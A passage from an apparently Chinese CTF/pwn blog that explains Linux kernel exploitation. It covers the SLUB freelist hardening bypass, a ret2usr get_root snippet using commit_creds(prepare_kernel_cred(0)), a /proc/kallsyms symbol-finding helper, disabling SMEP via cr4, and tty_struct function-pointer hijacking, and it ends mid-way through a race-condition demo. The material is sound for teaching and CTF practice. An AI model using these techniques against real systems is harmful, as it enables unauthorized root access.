class="line"><span class="comment">        如果执行到一半s-&gt;cpu_slab被其他slub拿去使用, 那么compare失败, 不执行写入, 返回redo重新试一下</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">		<span class="keyword">if</span> (unlikely(!this_cpu_cmpxchg_double(</span><br><span class="line">				s-&gt;cpu_slab-&gt;freelist, s-&gt;cpu_slab-&gt;tid,</span><br><span class="line">				object, tid,</span><br><span class="line">				next_object, next_tid(tid)))) &#123; <span class="comment">// next_tid(tid)相当于tid+1</span></span><br><span class="line"></span><br><span class="line">			note_cmpxchg_failure(<span class="string">&quot;slab_alloc&quot;</span>, s, tid);</span><br><span class="line">			<span class="keyword">goto</span> redo;</span><br><span class="line">		&#125;</span><br><span class="line">		prefetch_freepointer(s, next_object); <span class="comment">// 把预读进缓存</span></span><br><span class="line">		stat(s, ALLOC_FASTPATH); <span class="comment">// 记录状态</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(gfpflags &amp; __GFP_ZERO) &amp;&amp; object) <span class="comment">// 如果flag要求清0</span></span><br><span class="line">		<span class="built_in">memset</span>(object, <span class="number">0</span>, s-&gt;object_size);</span><br><span class="line"></span><br><span class="line">	slab_post_alloc_hook(s, gfpflags, <span class="number">1</span>, &amp;object); <span class="comment">// 空操作</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>这里我们主要考虑 fastpath，也就是使用 freelist 的这种情况</li>
</ul>
<p>get_freepointer_safe：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> *<span class="title">get_freepointer_safe</span><span class="params">(struct kmem_cache *s, <span class="keyword">void</span> *object)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> freepointer_addr;</span><br><span class="line">	<span class="keyword">void</span> *p;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!debug_pagealloc_enabled()) <span class="comment">/* 如果没开启CONFIG_DEBUG_PAGEALLOC,那么就会进入get_freepointer() */</span></span><br><span class="line">		<span class="keyword">return</span> get_freepointer(s, object);</span><br><span class="line">	</span><br><span class="line">    <span class="comment">/* 否则就会进行加密 */</span></span><br><span class="line">	freepointer_addr = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)object + s-&gt;offset;</span><br><span class="line">	probe_kernel_read(&amp;p, (<span class="keyword">void</span> **)freepointer_addr, <span class="keyword">sizeof</span>(p));</span><br><span class="line">	<span class="keyword">return</span> freelist_ptr(s, p, freepointer_addr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>这就是 Harden_freelist 保护（使用 <code>s-&gt;random</code> 与 <code>指针所在地址</code>  去加密原空闲指针）</li>
<li>加固指针 = 空闲指针 ^ 空闲指针地址 ^ 随机数R，只要知道这些值就可以绕过 Harden_freelist </li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/21/kernel%20attack/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/21/kernel%20attack/" class="post-title-link" itemprop="url">kernel attack（持续更新）</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-05-21 01:37:34" itemprop="dateCreated datePublished" datetime="2022-05-21T01:37:34+08:00">2022-05-21</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-05-22 13:41:50" itemprop="dateModified" datetime="2023-05-22T13:41:50+08:00">2023-05-22</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Technology/" itemprop="url" rel="index"><span itemprop="name">Technology</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>28k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>26 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="ret2usr"><a href="#ret2usr" class="headerlink" title="ret2usr"></a>ret2usr</h2><p>核心：利用 commit_creds(prepare_kernel_cred(0)) 进行提取</p>
<p>原理：该方式会自动生成一个合法的 cred，并定位当前线程的 task_struct 的位置，然后修改它的 cred 为新的 cred</p>
<p>当已知 commit_creds 和 prepare_kernel_cred 的函数地址时，用如下代码进行提权：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_root</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* (*pkc)(<span class="keyword">int</span>) = prepare_kernel_cred;</span><br><span class="line">    <span class="keyword">void</span> (*cc)(<span class="keyword">char</span>*) = commit_creds;</span><br><span class="line">    (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>注意：“prepare_kernel_cred”和“commit_creds”都是地址，需要用函数指针执行</li>
</ul>
<p>对于这两个函数的地址，可以在 “/proc/kallsyms-内核符号表” 中找到，提供以下脚本：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> commit_creds = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">find_symbols</span><span class="params">()</span> <span class="comment">/* 收集必要信息 */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE* kallsyms_fd = fopen(<span class="string">&quot;/proc/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(kallsyms_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open kallsyms error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span>(fgets(buf, <span class="number">0x30</span>, kallsyms_fd))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(commit_creds &amp; prepare_kernel_cred) </span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds)</span><br><span class="line">        &#123;	</span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;commit_creds);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>, commit_creds);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;prepare_kernel_cred);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(prepare_kernel_cred &amp; commit_creds))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]Error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>注意：如果在 init 文件中看到如下代码，就不能通过 /proc/kallsyms 查看函数地址了</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 1 &gt; /proc/sys/kernel/kptr_restrict # 设置kptr_restrict为&#x27;1&#x27;</span><br></pre></td></tr></table></figure>
<p>如果开启了 smep，则需要使用 <code>mov cr4, 0x1407e0</code> 关闭 smep</p>
<h2 id="tty-struct-attack"><a href="#tty-struct-attack" class="headerlink" title="tty_struct attack"></a>tty_struct attack</h2><p>在 <code>open(&quot;/dev/ptmx&quot;, O_RDWR)</code> 时会分配这样一个结构体：tty_struct </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* size:0x2e0(kmalloc-0x400) */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> magic;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kref</span> <span class="title">kref</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line">    <span class="comment">/* Protects ldisc changes: Lock tty not pty */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ld_semaphore</span> <span class="title">ldisc_sem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_ldisc</span> *<span class="title">ldisc</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">atomic_write_lock</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">legacy_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">throttle_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span> <span class="title">termios_rwsem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">winsize_mutex</span>;</span></span><br><span class="line">    <span class="keyword">spinlock_t</span> ctrl_lock;</span><br><span class="line">    <span class="keyword">spinlock_t</span> flow_lock;</span><br><span class="line">    <span class="comment">/* Termios values are protected by the termios rwsem */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ktermios</span> <span class="title">termios</span>, <span class="title">termios_locked</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">termiox</span> *<span class="title">termiox</span>;</span>    <span class="comment">/* May be NULL for unsupported */</span></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">64</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">pgrp</span>;</span>       <span class="comment">/* Protected by ctrl lock */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">session</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line">    <span class="keyword">int</span> count;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">winsize</span> <span class="title">winsize</span>;</span>     <span class="comment">/* winsize_mutex */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stopped:<span class="number">1</span>,    <span class="comment">/* flow_lock */</span></span><br><span class="line">              flow_stopped:<span class="number">1</span>,</span><br><span class="line">              unused:BITS_PER_LONG - <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> hw_stopped;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ctrl_status:<span class="number">8</span>,    <span class="comment">/* ctrl_lock */</span></span><br><span class="line">              packet:<span class="number">1</span>,</span><br><span class="line">              unused_ctrl:BITS_PER_LONG - <span class="number">9</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> receive_room;  <span class="comment">/* Bytes free for queue */</span></span><br><span class="line">    <span class="keyword">int</span> flow_change;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">link</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync</span>;</span></span><br><span class="line">    <span class="keyword">wait_queue_head_t</span> write_wait;</span><br><span class="line">    <span class="keyword">wait_queue_head_t</span> read_wait;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">hangup_work</span>;</span></span><br><span class="line">    <span class="keyword">void</span> *disc_data;</span><br><span class="line">    <span class="keyword">void</span> *driver_data;</span><br><span class="line">    <span class="keyword">spinlock_t</span> files_lock;      <span class="comment">/* protects tty_files list */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">tty_files</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N_TTY_BUF_SIZE 4096</span></span><br><span class="line">    <span class="keyword">int</span> closing;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *write_buf;</span><br><span class="line">    <span class="keyword">int</span> write_cnt;</span><br><span class="line">    <span class="comment">/* If the tty has a pending do_SAK, queue it here - akpm */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">SAK_work</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_port</span> *<span class="title">port</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>
<ul>
<li>ops：指向 ptm_unix98_ops，因此它可能会泄漏（可以绕过 Kaslr）</li>
<li>ops：可以覆写执行任意函数</li>
</ul>
<p>另一个很有趣的结构体：<code>tty_operations</code>（<code>tty_struct[4]</code>）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,</span></span><br><span class="line"><span class="class">            <span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line">    <span class="keyword">int</span>  (*install)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*remove)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*open)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">    <span class="keyword">void</span> (*close)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">    <span class="keyword">void</span> (*shutdown)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*cleanup)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*write)(struct tty_struct * tty,</span><br><span class="line">              <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf, <span class="keyword">int</span> count);</span><br><span class="line">    <span class="keyword">int</span>  (*put_char)(struct tty_struct *tty, <span class="keyword">unsigned</span> <span class="keyword">char</span> ch);</span><br><span class="line">    <span class="keyword">void</span> (*flush_chars)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*write_room)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*chars_in_buffer)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*ioctl)(struct tty_struct *tty,</span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">    <span class="keyword">long</span> (*compat_ioctl)(struct tty_struct *tty,</span><br><span class="line">                 <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">    <span class="keyword">void</span> (*set_termios)(struct tty_struct *tty, struct ktermios * old);</span><br><span class="line">    <span class="keyword">void</span> (*throttle)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*unthrottle)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*stop)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*start)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*hangup)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*break_ctl)(struct tty_struct *tty, <span class="keyword">int</span> state);</span><br><span class="line">    <span class="keyword">void</span> (*flush_buffer)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*set_ldisc)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*wait_until_sent)(struct tty_struct *tty, <span class="keyword">int</span> timeout);</span><br><span class="line">    <span class="keyword">void</span> (*send_xchar)(struct tty_struct *tty, <span class="keyword">char</span> ch);</span><br><span class="line">    <span class="keyword">int</span> (*tiocmget)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*tiocmset)(struct tty_struct *tty,</span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">set</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span> clear);</span><br><span class="line">    <span class="keyword">int</span> (*resize)(struct tty_struct *tty, struct winsize *ws);</span><br><span class="line">    <span class="keyword">int</span> (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);</span><br><span class="line">    <span class="keyword">int</span> (*get_icount)(struct tty_struct *tty,</span><br><span class="line">                struct serial_icounter_struct *icount);</span><br><span class="line">    <span class="keyword">void</span> (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CONSOLE_POLL</span></span><br><span class="line">    <span class="keyword">int</span> (*poll_init)(struct tty_driver *driver, <span class="keyword">int</span> line, <span class="keyword">char</span> *options);</span><br><span class="line">    <span class="keyword">int</span> (*poll_get_char)(struct tty_driver *driver, <span class="keyword">int</span> line);</span><br><span class="line">    <span class="keyword">void</span> (*poll_put_char)(struct tty_driver *driver, <span class="keyword">int</span> line, <span class="keyword">char</span> ch);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> (*proc_show)(struct seq_file *, <span class="keyword">void</span> *);</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>
<ul>
<li>全是函数指针，每一个都可以用来劫持</li>
<li>劫持过后，就可以通过调用对应的函数来执行我们想要的代码了</li>
</ul>
<h2 id="conditional-competition"><a href="#conditional-competition" class="headerlink" title="conditional competition"></a>conditional competition</h2><p>条件竞争就是两个或者多个进程或者线程同时处理一个资源（全局变量，文件）产生非预想的执行效果，从而产生程序执行流的改变，从而达到攻击的目的</p>
<p>条件竞争需要如下的条件：</p>
<ul>
<li>并发，即至少存在两个并发执行流：<ul>
<li>这里的执行流包括线程，进程，任务等级别的执行流</li>
</ul>
</li>
<li>共享对象，即多个并发流会访问同一对象：<ul>
<li>常见的共享对象有共享内存，文件系统，信号，一般来说，这些共享对象是用来使得多个程序执行流相互交流</li>
<li>此外，我们称访问共享对象的代码为临界区，在正常写代码时，这部分应该加锁</li>
</ul>
</li>
<li>改变对象，即至少有一个控制流会改变竞争对象的状态：因为如果程序只是对对象进行读操作，那么并不会产生条件竞争</li>
</ul>
<p>案例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> counter;</span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">IncreaseCounter</span><span class="params">(<span class="keyword">void</span>* args)</span> </span>&#123;</span><br><span class="line">    counter += <span class="number">1</span>;</span><br><span class="line">    sleep(<span class="number">0.1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Thread %d has counter value %d\n&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)pthread_self(), counter);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> p[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">        pthread_create(&amp;p[i], <span class="literal">NULL</span>, IncreaseCounter, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">        pthread_join(p[i], <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>创建10个线程，常理说应该线程应该按从小到大的顺序输出相应顺序的数字，但是由于 counter 是全局共享的资源，在 race window 的间隙里面可能多个线程对 counter 进行写、读操作，导致输出结果很难预料，如下： （多次尝试的结果还不同）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="built_in">exp</span> gcc test.c -o test -pthread</span><br><span class="line">➜  <span class="built_in">exp</span> ./test </span><br><span class="line">Thread <span class="number">-967665920</span> has counter value <span class="number">10</span></span><br><span class="line">Thread <span class="number">-1043200256</span> has counter value <span class="number">10</span></span><br><span class="line">Thread <span class="number">-1034807552</span> has counter value <span class="number">10</span></span><br><span class="line">Thread <span class="number">-976058624</span> has counter value <span class="number">10</span></span><br><span class="line">Thread <span class="number">-1026414848</span> has counter value <span class="number">10</span></span><br><span class="line">Thread <span class="number">-984451328</span> has counter value <span class="number">10</span></span><br><span class="line">Thread <span class="number">-992844032</span> has counter value <span class="number">10</span></span><br><span class="line">Thread <span class="number">-1009629440</span> has counter value <span class="number">10</span></span><br><span class="line">Thread 